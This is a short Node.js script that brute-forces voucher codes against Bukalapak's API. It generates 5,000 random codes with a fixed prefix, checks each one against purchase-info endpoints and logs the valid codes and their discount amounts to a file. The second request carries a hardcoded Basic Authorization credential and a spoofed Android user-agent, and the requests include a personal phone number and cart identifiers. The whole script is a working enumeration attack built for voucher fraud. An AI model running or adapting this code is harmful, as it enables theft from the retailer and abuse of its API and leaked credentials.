const rp = require('request-promise');
const randomstring = require('randomstring');
const fs = require('fs');

(async function() {
	for(let i = 1; i <= 5000; i++) {
		const base = "BLMOII";
		const rands = randomstring.generate({length: 4, charset: 'alphanumeric', capitalization: 'uppercase'});
		const voucher = `${base}${rands}`
		const a = await rp({
			url: 'https://api.bukalapak.com/v2/invoices/vp_purchase_info.json?package_id=74&type=phone_credit&voucher_code='+voucher+'&phone_number=08953528403&virtual_account_type=&payment_method=virtual_account',
			method: 'GET'
		});
		const b = JSON.parse(a).message;
		if (b == "Voucher hanya berlaku untuk pembelian Produk Fisik") {
			const option = {
				url: 'https://api.bukalapak.com/v2/invoices/get_purchase_info.json?seller_ids[]=19127611&cart_id=311215612&cart_item_ids[]=2765593090&amount=585000&shipping_cost=0&insurance_cost=0&voucher_code='+voucher+'&couriers[]=J%26T%20REG&province=Jambi&city=Sarolangun&transaction_summary=[[19127611,585000,0,0]]&priority_buyer_reduction=false&buy_priority_buyer=false&as_dropshipper=false&payment_method=virtual_account&virtual_account_type=&kredivo_payment_types=0',
				method: 'GET',
				headers:{
					'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-N950W Build/NMF26X) 4030003 BLAndroid BLMobile/4030003',
					'Authorization': 'Basic MTI0MDUzODI2Oko0OEI0WWNoQTd5VGJVdXlXZEJW'
				}
			};
			const start = await rp(option);
			const startJSON = JSON.parse(start);
			fs.appendFileSync('result.txt', `${voucher} | Amount : ${startJSON.voucher_amount}\n`);
			console.log(`${i}. ${voucher} | Amount : ${startJSON.voucher_amount}`);
		} else {
			console.log(`${i}. ${voucher} | Amount : 0`);
		}
	}
})();
